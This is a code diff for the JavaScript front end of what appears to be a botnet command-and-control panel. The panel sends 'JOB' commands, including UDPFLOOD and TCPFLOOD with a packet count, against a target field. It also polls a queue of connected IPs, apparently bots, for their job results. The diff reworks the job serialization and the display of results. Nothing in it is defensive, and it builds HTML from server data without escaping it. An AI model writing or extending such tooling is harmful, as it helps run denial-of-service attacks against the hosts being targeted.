@@ -70,10 +70,7 @@ $("#fieldform").submit(function(e) {
     
 	var jobVal = $("input[name=switch-one]:checked").val();
 	
-	var x = document.getElementById("field")
-	if (x == null) {
-		x = document.getElementById("target")
-	}
+	x = document.getElementById("target")
 	var formattedData = "JOB " + jobVal + " " + x.value
 	if(jobVal === "UDPFLOOD" || jobVal === "TCPFLOOD"){
 	  	formattedData += document.getElementById("count").value
@@ -82,12 +79,13 @@ $("#fieldform").submit(function(e) {
 	var dataJson = {
 	  	"job": formattedData, 
 	}
+	dataJson = encodeURIComponent(JSON.stringify(dataJson))
 	console.log(dataJson);
 	
 	$.ajax ({
 	  	type: "POST",
 	  	url: url,
-	  	data: $("#fieldform").serialize(),
+	  	data: dataJson,
 		success: function(data) {
 			console.log(data)
 	  		//alert(data);
@@ -95,27 +93,54 @@ $("#fieldform").submit(function(e) {
 	});
 });
 
+var clicked;
 function addConnection(data) {
 	var d = JSON.parse(data);
 	var s = "";
-	d['queue'].forEach(ip=> {
+	Object.keys(d['queue']).forEach(ip=> {
 		s += `<button type="button" class="collapsible">${ip}</button>
-<div class="content">
-	<p>Job Result:</p>
-</div>`;
+<div class="content" id="${ip}">
+	<p>Job Results:</p>`;
+		d['queue'][ip].forEach(res => {
+			s += `<p>${res}</p>`
+		});
+		s += `</div>`
 	});
-	document.getElementById("connect").innerHTML = s;
+	if (s){
+		document.getElementById("error").innerHTML = ""
+		document.getElementById("connect").innerHTML = s;
+	} else {
+		document.getElementById("error").innerHTML = "<p style='background-color: yellow;'>connection issues?</p>"
+	}
 }
+
+/*
+function collapsibleContent() {
+	//just for collapsable content
+	var coll = document.getElementsByClassName("collapsible");
+	var i;
+	for (i = 0; i < coll.length; i++) {
+		this.classList.toggle("active");
+		var content = this.nextElementSibling;
+		if (content.style.maxHeight){
+			content.style.maxHeight = null;
+		} else {
+			content.style.maxHeight = content.scrollHeight + "px";
+		} 
+	}
+}
+*/
 
 //queue
 $.get( "/api/queue", function( data ) {
-	console.log(data)
+	console.log(data);
 	addConnection(data);
 });
 setInterval(function(){
 	$.get( "/api/queue", function( data ) {
-		console.log(data)
+		console.log(data);
 		addConnection(data);
+		//collapsibleContent();
 	});
 }, 5000);
 
@@ -131,18 +156,3 @@ setInterval(function(){
 }, 2000);
 */
 
-//just for collapsable content
-var coll = document.getElementsByClassName("collapsible");
-var i;
-
-for (i = 0; i < coll.length; i++) {
-  coll[i].addEventListener("click", function() {
-    this.classList.toggle("active");
-    var content = this.nextElementSibling;
-    if (content.style.maxHeight){
-      content.style.maxHeight = null;
-    } else {
-      content.style.maxHeight = content.scrollHeight + "px";
-    } 
-  });
-}
